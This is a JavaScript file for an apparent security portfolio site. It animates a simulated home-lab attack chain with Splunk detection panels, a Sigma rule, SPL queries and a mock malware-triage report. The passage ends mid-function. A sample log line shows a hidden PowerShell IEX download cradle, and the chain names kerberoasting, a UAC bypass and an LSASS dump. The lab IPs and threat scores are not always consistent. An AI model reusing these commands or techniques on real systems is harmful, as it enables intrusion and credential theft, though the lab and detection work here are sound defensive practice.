/* ===================================================================
 *  simulations.js — In-browser simulations for experiences, skills,
 *  and projects. All vanilla JS, no external dependencies.
 * =================================================================== */

(function () {
  'use strict';

  const $ = (s, c = document) => c.querySelector(s);
  const $$ = (s, c = document) => Array.from(c.querySelectorAll(s));
  const el = (tag, cls, html) => {
    const n = document.createElement(tag);
    if (cls) n.className = cls;
    if (html != null) n.innerHTML = html;
    return n;
  };

  /* helper: format live clock for terminals */
  function ts() {
    const d = new Date();
    return d.toTimeString().slice(0, 8);
  }

  /* =================================================================
   *  SHARED VISUAL-SIM HELPERS
   *  - makeTimers: per-sim timer registry auto-cleared on modal close
   *  - vsLink: animated SVG link + SMIL packet flow between nodes
   *    (nodes are positioned in %, stage SVG uses viewBox 0 0 1000 H
   *     with preserveAspectRatio="none" so % and viewBox coords align)
   *  - vsRunSteps: drives a .vs-steps list through running/pass states
   * ================================================================= */
  const SVG_NS = 'http://www.w3.org/2000/svg';

  function makeTimers(host) {
    const timers = [];
    const prev = host.__cleanup;
    const api = {
      later(fn, t) { const id = setTimeout(fn, t); timers.push(id); return id; },
      every(fn, t) { const id = setInterval(fn, t); timers.push(id); return id; },
      clear() { timers.forEach((id) => { clearTimeout(id); clearInterval(id); }); timers.length = 0; }
    };
    host.__cleanup = () => { api.clear(); if (prev) prev(); };
    return api;
  }

  function vsInitSvg(stage, vbH) {
    const svg = stage.querySelector('svg.vs-svg');
    if (!svg) return null;
    svg.setAttribute('viewBox', `0 0 1000 ${vbH}`);
    svg.setAttribute('preserveAspectRatio', 'none');
    return svg;
  }

  function vsLink(svg, x1p, y1p, x2p, y2p, vbH, opts = {}) {
    if (!svg) return null;
    // build the point list (percentages → viewBox coords); optional waypoints
    const P = (xp, yp) => [xp * 10, (yp * vbH) / 100];
    const pts = [P(x1p, y1p)];
    (opts.pts || []).forEach((w) => pts.push(P(w[0], w[1])));
    pts.push(P(x2p, y2p));
    const pathStr = 'M ' + pts.map((p) => `${p[0]} ${p[1]}`).join(' L ');

    const line = document.createElementNS(SVG_NS, opts.pts && opts.pts.length ? 'polyline' : 'line');
    if (opts.pts && opts.pts.length) {
      line.setAttribute('points', pts.map((p) => `${p[0]},${p[1]}`).join(' '));
    } else {
      line.setAttribute('x1', pts[0][0]); line.setAttribute('y1', pts[0][1]);
      line.setAttribute('x2', pts[1][0]); line.setAttribute('y2', pts[1][1]);
    }
    line.setAttribute('class', 'vs-link' + (opts.cls ? ' ' + opts.cls : ''));
    line.setAttribute('fill', 'none');
    svg.appendChild(line);

    const g = document.createElementNS(SVG_NS, 'g');
    svg.appendChild(g);
    function addPackets(n, color, dur, r) {
      for (let i = 0; i < n; i++) {
        const c = document.createElementNS(SVG_NS, 'circle');
        c.setAttribute('r', r || 3.5);
        c.setAttribute('fill', color || 'var(--neon-3)');
        c.setAttribute('opacity', '0');
        const am = document.createElementNS(SVG_NS, 'animateMotion');
        am.setAttribute('dur', (dur || 1.3) + 's');
        am.setAttribute('repeatCount', 'indefinite');
        am.setAttribute('path', pathStr);
        am.setAttribute('begin', ((i * (dur || 1.3)) / n).toFixed(2) + 's');
        c.appendChild(am);
        const fade = document.createElementNS(SVG_NS, 'animate');
        fade.setAttribute('attributeName', 'opacity');
        fade.setAttribute('values', '0;1;1;0');
        fade.setAttribute('dur', (dur || 1.3) + 's');
        fade.setAttribute('repeatCount', 'indefinite');
        fade.setAttribute('begin', ((i * (dur || 1.3)) / n).toFixed(2) + 's');
        c.appendChild(fade);
        g.appendChild(c);
      }
    }
    const api = {
      line, group: g,
      packets(n, color, dur, r) {
        while (g.firstChild) g.removeChild(g.firstChild);
        addPackets(n, color, dur, r);
        return api;
      },
      on()  { g.style.display = ''; return api; },
      off() { g.style.display = 'none'; return api; },
      activate()   { line.classList.add('active'); return api; },
      deactivate() { line.classList.remove('active'); return api; }
    };
    if (opts.packets) addPackets(opts.packets, opts.color, opts.dur, opts.r);
    if (opts.hidden) api.off();
    if (opts.active) api.activate();
    return api;
  }

  /* drives each .vs-step of a list; phases: [{ dur, run(), end(), fail }] */
  function vsRunSteps(listEl, timers, phases) {
    const items = Array.from((listEl || {}).querySelectorAll ? listEl.querySelectorAll('.vs-step') : []);
    const failed = phases.map((p) => !!p.fail);
    const stateOf = (j) => (failed[j] ? 'fail' : 'pass');
    const labelOf = (j) => (failed[j] ? 'FAIL' : 'PASS');
    const apply = (i, cls, state) => {
      items.forEach((x, j) => {
        x.className = 'vs-step ' + (j < i ? stateOf(j) : j === i ? cls : 'pending');
        const st = x.querySelector('.vs-step-state');
        if (st) st.textContent = j < i ? labelOf(j) : j === i ? state : 'QUEUED';
      });
    };
    let t = 250;
    phases.forEach((p, i) => {
      const tRun = t;
      timers.later(() => { apply(i, 'running', 'RUNNING'); if (p.run) p.run(); }, tRun);
      t += p.dur;
      const tEnd = t;
      timers.later(() => {
        failed[i] = !!p.fail;
        items.forEach((x, j) => {
          x.className = 'vs-step ' + (j <= i ? stateOf(j) : 'pending');
          const st = x.querySelector('.vs-step-state');
          if (st) st.textContent = j <= i ? labelOf(j) : 'QUEUED';
        });
        if (p.end) p.end();
      }, tEnd);
    });
    return t; // total ms
  }

  /* =================================================================
   *  SIMULATION REGISTRY — each key is referenced from data.js
   * ================================================================= */
  const SIMS = {};

  /* ---- helper to attach a typed terminal ---- */
  function attachTerminal(host, lines, opts = {}) {
    const speed = opts.speed || 18;     // ms per char
    const linePause = opts.linePause || 220;
    const container = host;
    container.innerHTML = '';
    let i = 0;
    function typeLine(line) {
      return new Promise((resolve) => {
        const lineEl = el('div', 'term-line');
        container.appendChild(lineEl);
        // handle prompt class
        if (line.startsWith('$') || line.startsWith('>')) {
          const sp = el('span', 'term-prompt', line.slice(0, 1));
          lineEl.appendChild(sp);
          var text = line.slice(1);
        } else {
          var text = line;
        }
        // pick class based on content
        let cls = 'term-out';
        if (/error|fail|critical|fatal|denied/i.test(line)) cls = 'term-err';
        else if (/warn|caution|suspicious/i.test(line)) cls = 'term-warn';
        else if (/ok|success|passed|clean/i.test(line)) cls = 'term-ok';
        const textSpan = el('span', cls);
        lineEl.appendChild(textSpan);
        let j = 0;
        const tid = setInterval(() => {
          textSpan.textContent += text[j++];
          container.scrollTop = container.scrollHeight;
          if (j >= text.length) {
            clearInterval(tid);
            resolve();
          }
        }, speed);
      });
    }
    (async () => {
      for (const ln of lines) {
        await typeLine(ln);
        await new Promise((r) => setTimeout(r, linePause));
      }
      if (opts.loop) {
        setTimeout(() => attachTerminal(host, lines, opts), 1500);
      }
    })();
  }

  /* =================================================================
   *  1. SOC + PENTEST HOME LAB (Independent Research period)
   *     Tab 1 — SOC & Pentest Lab Simulation: 4-VM topology with
   *             animated lateral movement + Splunk detection panels
   *     Tab 2 — Lab 02: Sigma rule
   *     Tab 3 — Lab 03: Splunk SPL
   *     Tab 4 — Lab 04: CyberGuardian — process scan → AI → report
   *     Tab 5 — TryHackMe achievements
   * ================================================================= */
  SIMS['soc-homelab'] = (host, ctx) => {
    const timers = makeTimers(host);
    const THM_URL = (window.RESUME_DATA && window.RESUME_DATA.personal && window.RESUME_DATA.personal.contact && window.RESUME_DATA.personal.contact.tryhackme) || 'https://tryhackme.com/p/Souhaieb.M';
    host.innerHTML = `
      <div class="sim-h">SOC + PENTEST HOME LAB — 4-VM ATTACK & DETECTION ENVIRONMENT</div>
      <div class="sim-p">How the lab was built and how the attack unfolds: 2× Windows Server 2019 (Domain Controller + IIS Web), 1× Windows 10 Pro 22H2 victim, 1× Kali Linux attacker — all on a VirtualBox host-only network (192.168.56.0/24). Splunk Enterprise collects Sysmon telemetry from every Windows VM. Watch the 9-phase attack chain execute: the attacker lands on the victim via a phishing macro, moves laterally to the DC over WinRM, while the purple telemetry links stream detections to Splunk.</div>

      <div class="sim-section active" data-sim="dashboard">
        <div class="vm-stage" id="hl-stage">
          <svg class="vs-svg"></svg>
          <span class="vs-stage-label">VIRTUALBOX HOST-ONLY — 192.168.56.0/24</span>

          <div class="vm-node" id="hl-kali" style="left:15%;top:30%">
            <div class="vm-node-title"><span class="vm-ico">🐉</span>KALI 2026.1<span class="vm-led"></span></div>
            <div class="vm-node-sub">attacker · .56.103<br>metasploit · Rubeus</div>
          </div>

          <div class="vm-node" id="hl-victim" style="left:45%;top:70%">
            <div class="vm-node-title"><span class="vm-ico">🖥️</span>WIN10 PRO<span class="vm-led"></span></div>
            <div class="vm-node-sub">victim · .56.101<br>Sysmon v15 + UF</div>
          </div>

          <div class="vm-node" id="hl-dc" style="left:80%;top:30%">
            <div class="vm-node-title"><span class="vm-ico">🏰</span>SERVER 2019 DC<span class="vm-led"></span></div>
            <div class="vm-node-sub">corp.local · .56.102<br>AD DS + IIS + Sysmon</div>
          </div>
		  
		  <div class="vm-node" id="hl-splunk" style="left:80%;top:70%">
            <div class="vm-node-title"><span class="vm-ico">📊</span>SPLUNK ENT.<span class="vm-led"></span></div>
            <div class="vm-node-sub">SIEM · .56.50<br>index=main · Sysmon</div>
          </div>

          <div class="vs-phase-line" id="hl-phase">LAB READY — 4 VMs powered on, telemetry flowing to Splunk</div>
        </div>

        <div class="siem-grid">
          <div class="siem-panel">
            <div class="siem-head"><span>SPLUNK EVENT STREAM — index=main sourcetype=WinEventLog:Sysmon</span><span class="blink" style="color:var(--neon)">●</span></div>
            <div class="siem-log-stream" id="siem-stream"></div>
          </div>
          <div class="siem-panel">
            <div class="siem-head"><span>SECURITY KPIs — last 60min</span><span style="color:var(--fg-dim)">refresh=15s</span></div>
            <div class="siem-kpis" id="siem-kpis"></div>
            <div class="siem-head" style="margin-top:10px"><span>MITRE ATT&CK HEATMAP</span><span style="color:var(--fg-dim)">10 tactics</span></div>
            <div id="siem-heat"></div>
          </div>
        </div>
        <div style="margin-top:14px">
          <div class="sim-h">ATTACK CHAIN — 9 PHASES (executed on the topology above)</div>
          <div class="attack-chain" id="chain-grid"></div>
        </div>
      </div>

      <div class="sim-section" data-sim="sigma">
        <div class="sim-h">SIGMA RULE — Scheduled Task Persistence (T1053.005)</div>
        <div class="sim-p">One of the 9 Sigma rules authored for the lab — each rule maps to one phase of the attack chain and was validated by replaying the phase and confirming the detection fires in Splunk.</div>
        <pre class="code-viewer"><span class="k">title</span>: <span class="s">Scheduled Task Creation for Persistence</span>
<span class="k">id</span>: <span class="s">4d5e6f7a-8b9c-0123-defa-234567890123</span>
<span class="k">status</span>: <span class="s">production</span>
<span class="k">description</span>: <span class="c"># Detects scheduled tasks that may be used for persistence. Monitors Security Event ID 4698 and Task Scheduler Event ID 106.</span>
<span class="k">references</span>:
  - <span class="s">https://attack.mitre.org/techniques/T1053/005/</span>
<span class="k">author</span>: <span class="s">SOC Home Lab Project Alpha</span>
<span class="k">tags</span>:
  - <span class="s">attack.persistence</span>
  - <span class="s">attack.t1053.005</span>
<span class="k">logsource</span>:
  <span class="k">product</span>: <span class="s">windows</span>
  <span class="k">service</span>: <span class="s">security</span>
<span class="k">detection</span>:
  <span class="k">selection_4698</span>:
    <span class="k">EventID</span>: <span class="n">4698</span>
  <span class="k">selection_106</span>:
    <span class="k">EventID</span>: <span class="n">106</span>
    <span class="k">Source</span>: <span class="s">Microsoft-Windows-TaskScheduler</span>
  <span class="k">suspicious_names</span>:
    <span class="k">TaskName|contains</span>:
      - <span class="s">SystemHealth</span>
      - <span class="s">Updater</span>
      - <span class="s">Monitor</span>
  <span class="k">condition</span>: <span class="s">(selection_4698 or selection_106) and suspicious_names</span>
<span class="k">falsepositives</span>:
  - <span class="s">Legitimate software installation</span>
<span class="k">level</span>: <span class="s">medium</span></pre>
      </div>

      <div class="sim-section" data-sim="spl">
        <div class="sim-h">SPLUNK SPL — Privilege Escalation: UAC Bypass via eventvwr.exe</div>
        <div class="sim-p">Detection queries executed against the collected Sysmon telemetry — each query was validated by replaying the corresponding attack phase and confirming the expected events return.</div>
        <pre class="code-viewer"><span class="c"># Query 1 — Registry modification for UAC bypass (Sysmon Event ID 13)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">13</span> TargetObject=<span class="s">"*mscfile*"</span>
| table _time, Message

<span class="c"># Query 2 — eventvwr.exe execution (Sysmon Event ID 1)</span>
index=main sourcetype=<span class="s">"WinEventLog:Sysmon"</span> EventCode=<span class="n">1</span> ParentImage=<span class="s">"*eventvwr.exe*"</span>
| table _time, Message

<span class="c"># Query 3 — Proof file access (Security 4656 OR 4663)</span>
index=main sourcetype=<span class="s">"WinEventLog:Security"</span> (EventCode=<span class="n">4656</span> OR EventCode=<span class="n">4663</span>) ObjectName=<span class="s">"*msfile*"</span>
| table _time, Message</pre>
      </div>

      <div class="sim-section" data-sim="cyberguardian">
        <div class="sim-h">CYBERGUARDIAN — SCAN → AI ANALYSIS → FINAL REPORT</div>
        <div class="sim-p">The fourth lab: my open-source malware detection tool. CyberGuardian first sweeps running processes (layer 1), correlates the hits with YARA rules, VirusTotal and network telemetry (layer 2), then hands the evidence to the AI engine (layer 3) which classifies the threat, maps it to MITRE ATT&CK and generates the final report (layer 4). The pipeline below replays a real triage.</div>

        <div class="cg-pipe" id="cg-pipe">
          <div class="cg-pstep" data-p="1"><span class="cg-pstep-ico">🔍</span>Process Scan</div>
          <div class="cg-pstep" data-p="2"><span class="cg-pstep-ico">🧩</span>IOC Correlation</div>
          <div class="cg-pstep" data-p="3"><span class="cg-pstep-ico">🤖</span>AI Analysis</div>
          <div class="cg-pstep" data-p="4"><span class="cg-pstep-ico">📄</span>Final Report</div>
        </div>

        <div class="skill-modal-grid" style="margin-bottom:14px">
          <div>
            <div class="sim-h">LAYER 1 — PROCESS SWEEP (live)</div>
            <div class="cg-proc">
              <div class="cg-proc-row head">
                <span>PID</span><span>PROCESS</span><span>YARA / VT</span><span>BEHAVIOR</span><span>VERDICT</span>
              </div>
              <div class="cg-proc-row" data-proc="1"><span>892</span><span>explorer.exe</span><span class="cg-dim">no match</span><span class="cg-dim">normal session</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="2"><span>1044</span><span>chrome.exe</span><span class="cg-dim">no match</span><span class="cg-dim">user browsing</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="3"><span>712</span><span>svchost.exe</span><span class="ioc">malware_generic_loader · VT 38/72</span><span>parent=spoolsv.exe ⚠</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="4"><span>4812</span><span>powershell.exe</span><span class="ioc">encoded_cmd · VT 12/92 (IP)</span><span>beacon → .56.103:443 ⚠</span><span class="cg-verdict" data-v>…</span></div>
              <div class="cg-proc-row" data-proc="5"><span>3310</span><span>winlogon.exe</span><span class="cg-dim">no match</span><span class="cg-dim">system session</span><span class="cg-verdict" data-v>…</span></div>
            </div>

            <div class="sim-h" style="margin-top:12px">LAYER 2 — IOC CORRELATION</div>
            <ul class="vs-steps">
              <li class="vs-step fail"><span class="vs-step-ico">🧬</span><div class="vs-step-body"><b>YARA</b> — malware_generic_loader + mimikatz_signature matched in memory (PID 712)</div><span class="vs-step-state">HIT</span></li>
              <li class="vs-step fail"><span class="vs-step-ico">🌐</span><div class="vs-step-body"><b>VirusTotal</b> — 38/72 engines flag the binary; C2 IP reputation 12/92 malicious</div><span class="vs-step-state">HIT</span></li>
              <li class="vs-step fail"><span class="vs-step-ico">📡</span><div class="vs-step-body"><b>Network</b> — 60s beacon interval to 192.168.56.103:443, HTTP POST /check-in</div><span class="vs-step-state">HIT</span></li>
            </ul>
          </div>
          <div>
            <div class="sim-h">LAYER 3 — AI ANALYSIS</div>
            <div class="cg-report">
              <div class="cg-report-head">
                <span class="cg-report-title">AI ENGINE</span>
                <span style="display:flex;gap:5px;flex-wrap:wrap">
                  <span class="stack-chip" style="border-color:var(--neon);color:var(--neon)">DeepSeek ✓</span>
                  <span class="stack-chip">OpenAI</span>
                  <span class="stack-chip">Gemini</span>
                </span>
              </div>
              <div class="cg-report-sec show" style="margin-bottom:10px">
                <h6>Evidence submitted</h6>
                IFEO Debugger Injection · YARA: uac_bypass_eventvwr · VT 41/72 · C2 beacon 60s · lsass.dmp handle
              </div>
              <div class="cg-report-sec show">
                <h6>Verdict</h6>
                <div style="font-size:16px;font-family:var(--display);color:var(--neon-3);margin-bottom:4px" id="cg-verdict">analyzing…</div>
                <div id="cg-verdict-sub" style="color:var(--fg-dim);font-size:11px">correlating 5 detection vectors…</div>
              </div>
            </div>
          </div>
        </div>

        <div class="sim-h">LAYER 4 — AI-GENERATED FINAL REPORT</div>
        <div class="cg-report" id="cg-report">
          <div class="cg-report-head">
            <span class="cg-report-title">CYBERGUARDIAN — INCIDENT REPORT #CG-2026-0117</span>
            <span class="jira-sev critical">MALICIOUS · 9.2/10</span>
          </div>
          <div class="cg-report-sec" data-sec="1">
            <h6>Executive summary</h6>
            Host WIN10-VICTIM (192.168.56.101) is compromised by a credential-stealing trojan delivered via a macro-enabled document. Two processes are actively malicious: a trojanized svchost.exe (PID 712) and a PowerShell beacon (PID 4812) communicating with a known-malicious C2 at 192.168.56.103.
          </div>
          <div class="cg-report-sec" data-sec="2">
            <h6>Findings</h6>
            F-01 — Malicious parent-child chain: spoolsv.exe → svchost.exe (T1055 process injection)<br>
            F-02 — PowerShell network beacon, 60s interval to C2 :443 (T1071.001)<br>
            F-03 — LSASS memory access — credential dump in progress (T1003.001)
          </div>
          <div class="cg-report-sec" data-sec="3">
            <h6>MITRE ATT&CK mapping</h6>
            T1055 · T1071.001 · T1003.001 · T1548.002 · T1059.001 — mapped automatically by the AI engine from the raw detection JSON.
          </div>
          <div class="cg-report-sec" data-sec="4">
            <h6>Recommendations</h6>
            Isolate the host from the network immediately · block 192.168.56.103 at the firewall · capture full memory with Volatility 3 · rotate all credentials used on the host · hunt the same YARA signatures across the fleet.
          </div>
          <div class="cg-report-sec" data-sec="5">
            <h6>IOC list</h6>
            sha256: 4f8c…e201 · C2: 192.168.56.103:443 · persistence: HKCU\\…\\mscfile\\shell\\open\\command · task: \\SystemHealthMonitor
          </div>
        </div>
      </div>

      <div class="sim-section" data-sim="thm">
        <div class="sim-h">TRYHACKME — LEARNING & ACHIEVEMENTS</div>
        <div class="sim-p">400+ hands-on rooms completed across blue and red team paths (global top 1%), 50+ CTF challenges, and four completed certification paths. Selected achievements below — full room history on the profile.</div>

        <div class="kpi-strip">
          <div class="kpi-box"><div class="kpi-box-val">400+</div><div class="kpi-box-lbl">Rooms completed</div></div>
          <div class="kpi-box"><div class="kpi-box-val alert">TOP 1%</div><div class="kpi-box-lbl">Global rank</div></div>
          <div class="kpi-box"><div class="kpi-box-val">50+</div><div class="kpi-box-lbl">CTF challenges</div></div>
          <div class="kpi-box"><div class="kpi-box-val">4</div><div class="kpi-box-lbl">Certified paths</div></div>
        </div>

        <div class="sim-h">CERTIFIED LEARNING PATHS</div>
        <div class="thm-paths">
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🛡️ SOC Level 1</span>
              <span class="thm-path-cert">CERTIFIED 2024</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">triage · log analysis · SIEM · incident response</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🛡️ SOC Level 2</span>
              <span class="thm-path-cert">CERTIFIED 2025</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">threat hunting · detection engineering · malware analysis</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">⚔️ Jr Penetration Tester</span>
              <span class="thm-path-cert">CERTIFIED 2023</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">web exploitation · privilege escalation · network attacks</div>
          </div>
          <div class="thm-path">
            <div class="thm-path-head">
              <span class="thm-path-name">🔐 Cyber Security 101</span>
              <span class="thm-path-cert">CERTIFIED 2024</span>
            </div>
            <div class="thm-bar"><div class="thm-bar-fill" data-thm-fill="100"></div></div>
            <div class="thm-path-sub">core principles · Linux &amp; Windows fundamentals · networking</div>
          </div>
        </div>

        <div class="sim-h">REPRESENTATIVE ROOMS COMPLETED <span style="color:var(--fg-dim);text-transform:none;letter-spacing:0">(of 400+)</span></div>
        <div class="thm-rooms">
          <div class="thm-room"><span class="done-ico">✓</span>Wireshark 101</div>
          <div class="thm-room"><span class="done-ico">✓</span>Nmap</div>
          <div class="thm-room"><span class="done-ico">✓</span>Yara</div>
          <div class="thm-room"><span class="done-ico">✓</span>Kerberoasting</div>
          <div class="thm-room"><span class="done-ico">✓</span>Windows Forensics 1</div>
          <div class="thm-room"><span class="done-ico">✓</span>Linux Forensics</div>
          <div class="thm-room"><span class="done-ico">✓</span>OWASP Top 10</div>
          <div class="thm-room"><span class="done-ico">✓</span>SQL Injection</div>
          <div class="thm-room"><span class="done-ico">✓</span>Cross-Site Scripting</div>
          <div class="thm-room"><span class="done-ico">✓</span>Hydra</div>
          <div class="thm-room"><span class="done-ico">✓</span>John The Ripper</div>
          <div class="thm-room"><span class="done-ico">✓</span>Burp Suite: The Basics</div>
          <div class="thm-room"><span class="done-ico">✓</span>Intro to Malware Analysis</div>
          <div class="thm-room"><span class="done-ico">✓</span>MITRE</div>
          <div class="thm-room"><span class="done-ico">✓</span>File Inclusion</div>
          <div class="thm-room"><span class="done-ico">✓</span>SSRF</div>
          <div class="thm-room"><span class="done-ico">✓</span>Red Team Recon</div>
          <div class="thm-room"><span class="done-ico">✓</span>Password Attacks</div>
        </div>

        <div class="sim-h" style="margin-top:14px">SKILLS PRACTISED ACROSS THE ROOMS</div>
        <div style="display:flex;flex-wrap:wrap;gap:6px;font-size:10px">
          ${['Log Analysis','Splunk','Wireshark','tcpdump','Nmap','Burp Suite','OWASP Top 10','Active Directory Attacks','Kerberoasting','Hash Cracking','Phishing Analysis','Digital Forensics','Memory Forensics','Malware Analysis','YARA','Privilege Escalation','Web App Pentesting','CTF'].map(s => `<span class="stack-chip">${s}</span>`).join('')}
        </div>

        <div style="margin-top:16px;text-align:center">
          <a class="btn-sim" href="${THM_URL}" target="_blank" rel="noopener" style="display:inline-block;text-decoration:none">
            <span class="blink">▸</span> VIEW_FULL_PROFILE_ON_TRYHACKME
          </a>
        </div>
      </div>
    `;

    /* ---- Tab 1: VM topology + lateral movement animation ---- */
    const stage = $('#hl-stage', host);
    const svg = vsInitSvg(stage, 280);
    const VB = 280;
    const kaliNode = $('#hl-kali', host), victimNode = $('#hl-victim', host),
          dcNode = $('#hl-dc', host), splunkNode = $('#hl-splunk', host);
    const linkKali  = vsLink(svg, 12, 28, 42, 72, VB, { cls: 'attack', hidden: true });
    const linkLateral = vsLink(svg, 42, 72, 74, 28, VB, { cls: 'attack', hidden: true });
    const linkTelV = vsLink(svg, 42, 72, 74, 82, VB, { cls: 'telemetry active' });
    // route DC→Splunk around the right side so the link is never hidden behind the boxes
    const linkTelD = vsLink(svg, 74, 28, 74, 82, VB, { cls: 'telemetry active', pts: [[93, 28], [93, 82]] });
    const phaseLine = $('#hl-phase', host);

    function playLab() {
      // reset
      kaliNode.className = 'vm-node'; victimNode.className = 'vm-node';
      dcNode.className = 'vm-node'; splunkNode.className = 'vm-node';
      [linkKali, linkLateral].forEach((l) => { if (l) { l.off(); l.deactivate(); } });
      if (linkTelV) linkTelV.packets(2, 'var(--neon-5)', 2.0).on();
      if (linkTelD) linkTelD.packets(2, 'var(--neon-5)', 2.0).on();
      phaseLine.innerHTML = 'LAB READY — 4 VMs powered on, telemetry flowing to Splunk';

      const seq = [
        { t: 1200, run() {
            phaseLine.innerHTML = '<span class="warn">PHASE 01-02/09 — INITIAL ACCESS + EXECUTION: phishing invoice.xlsm → VBA macro → PowerShell IEX cradle on VICTIM</span>';
            kaliNode.className = 'vm-node active';
            victimNode.className = 'vm-node hit';
            if (linkKali) linkKali.activate().packets(4, 'var(--neon-3)', 1.1).on();
          } },
        { t: 4200, run() {
            phaseLine.innerHTML = '<span class="warn">PHASE 03-05/09 — ENUMERATION + PRIV-ESC + PERSISTENCE on VICTIM (Rubeus kerberoast · eventvwr UAC bypass · scheduled task)</span>';
          } },
        { t: 7400, run() {
            phaseLine.innerHTML = '<span class="err">PHASE 06/09 — LATERAL MOVEMENT: WinRM → Domain Controller 192.168.56.10 (Pass-the-Ticket)</span>';
            dcNode.className = 'vm-node active';
            if (linkLateral) linkLateral.activate().packets(4, 'var(--neon-3)', 1.3).on();
          } },
        { t: 10600, run() {
            phaseLine.innerHTML = '<span class="err">PHASE 07-09/09 — C2 BEACON + DC PERSISTENCE + LSASS DUMP: svchost_updater.exe · malicious service · ProcDump -ma lsass.dmp</span>';
            dcNode.className = 'vm-node hit';
          } },
        { t: 13800, run() {
            phaseLine.innerHTML = 'ALL 9 PHASES EXECUTED — every phase detected by Sigma + Splunk SPL (see Labs 02 &amp; 03) — full IR documentation per phase';
            splunkNode.className = 'vm-node active';
          } }
      ];
      seq.forEach((s) => timers.later(s.run, s.t));
      timers.later(() => playLab(), 18500); // loop
    }
    playLab();

    /* ---- Tab 1: KPIs, heatmap, chain, log stream ---- */
    const kpiData = [
      { val: '14', lbl: 'CRITICAL', cls: 'alert' },
      { val: '37', lbl: 'WARNINGS' },
      { val: '212', lbl: 'INFO' },
      { val: '99.2%', lbl: 'COVERAGE' }
    ];
    const kpis = $('#siem-kpis', host);
    kpiData.forEach((k) => {
      const t = el('div', 'siem-kpi' + (k.cls ? ' ' + k.cls : ''));
      t.innerHTML = `<div class="siem-kpi-val">${k.val}</div><div class="siem-kpi-lbl">${k.lbl}</div>`;
      kpis.appendChild(t);
    });

    // heatmap
    const tactics = [
      'Initial Access', 'Execution', 'Persistence', 'Priv Esc',
      'Defense Evasion', 'Cred Access', 'Discovery', 'Lateral',
      'Collection', 'Impact'
    ];
    const heat = $('#siem-heat', host);
    const heatGrid = el('div');
    heatGrid.style.cssText = 'display:grid;grid-template-columns:repeat(5,1fr);gap:4px';
    const heatLevels = [3, 4, 5, 4, 3, 2, 1, 3, 2, 1];
    tactics.forEach((t, i) => {
      const cell = el('div');
      const lvl = heatLevels[i];
      cell.style.cssText = `padding:6px 4px;border:1px solid var(--line);text-align:center;font-size:9px;color:var(--fg-soft);background:rgba(255,${184 - lvl * 25},${0 + lvl * 15},0.08)`;
      cell.innerHTML = `<div style="color:var(--neon-${lvl > 3 ? '3' : '4'});font-family:var(--display);font-weight:800">${lvl}</div>${t}`;
      heatGrid.appendChild(cell);
    });
    heat.appendChild(heatGrid);

    // attack chain (in sync with the topology animation)
    const chain = [
      { no: '01', name: 'Initial Access', tool: 'invoice.xlsm (VBA macro)', tactic: 'T1566.001' },
      { no: '02', name: 'Execution',       tool: 'PowerShell IEX cradle', tactic: 'T1059.001' },
      { no: '03', name: 'Enumeration',     tool: 'Rubeus.exe kerberoast',  tactic: 'T1558.003' },
      { no: '04', name: 'Privilege Escalation', tool: 'eventvwr.exe UAC bypass', tactic: 'T1548.002' },
      { no: '05', name: 'Persistence',     tool: 'SystemHealthMonitor task', tactic: 'T1053.005' },
      { no: '06', name: 'Lateral Movement', tool: 'WinRM / Invoke-Command', tactic: 'T1021.006' },
      { no: '07', name: 'C2 Beacon on DC', tool: 'svchost_updater.exe', tactic: 'T1543.003' },
      { no: '08', name: 'DC Persistence',   tool: 'Malicious service',     tactic: 'T1543.003' },
      { no: '09', name: 'Credential Dump', tool: 'ProcDump -ma lsass.dmp', tactic: 'T1003.001' }
    ];
    const chainGrid = $('#chain-grid', host);
    function playChain() {
      const nodes = $$('.chain-node', chainGrid);
      nodes.forEach((n) => n.classList.remove('active', 'done'));
      chain.forEach((c, i) => {
        timers.later(() => { nodes[i].classList.add('active'); }, 400 + i * 1500);
        timers.later(() => { if (nodes[i]) { nodes[i].classList.remove('active'); nodes[i].classList.add('done'); } }, 400 + i * 1500 + 1300);
      });
    }
    chain.forEach((c) => {
      const node = el('div', 'chain-node');
      node.innerHTML = `<div class="chain-no">PHASE ${c.no}</div><div class="chain-name">${c.name}</div><div class="chain-tool">▸ ${c.tool}</div><div class="chain-tactic">${c.tactic}</div>`;
      chainGrid.appendChild(node);
    });
    playChain();
    timers.later(() => playChain(), 18500); // in sync with topology loop

    // log stream
    const stream = $('#siem-stream', host);
    const logTemplates = [
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: powershell.exe -ExecutionPolicy Bypass -w hidden IEX (New-Object Net.WebClient).DownloadString`],
      ['warn', `[${ts()}] Security/4698 Scheduled task created: TaskName='\\SystemHealthMonitor' Author=WIN-DC\\Administrator`],
      ['crit', `[${ts()}] Sysmon/10 ProcessAccess: lsass.exe accessed by svchost.exe PID=712 (SourceImage: C:\\Windows\\Temp\\svchost_updater.exe)`],
      ['info', `[${ts()}] Sysmon/1 ProcessCreate: eventvwr.exe (parent: explorer.exe) — possible UAC bypass chain`],
      ['crit', `[${ts()}] Security/4624 Logon: User=Administrator LogonType=3 NetworkAddress=192.168.56.103 — Pass-the-Ticket`],
      ['warn', `[${ts()}] Sysmon/13 RegistryValueSet: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command = "C:\\Windows\\Temp\\explorer.exe"`],
      ['info', `[${ts()}] Splunk: detection 'win_scheduled_task_persistence' fired — Sigma rule T1053.005`],
      ['crit', `[${ts()}] Memory: Volatility3 --lsass dump — Mimikatz signature detected, NT hash extracted`],
      ['info', `[${ts()}] Rubeus: kerberoast complete — TGT for svc-sql extracted (rc4_hmac)`]
    ];
    let li = 0;
    function pushLog() {
      const [lvl, txt] = logTemplates[li % logTemplates.length];
      const line = el('div', `siem-log-line ${lvl}`, txt);
      stream.appendChild(line);
      const all = $$('.siem-log-line', stream);
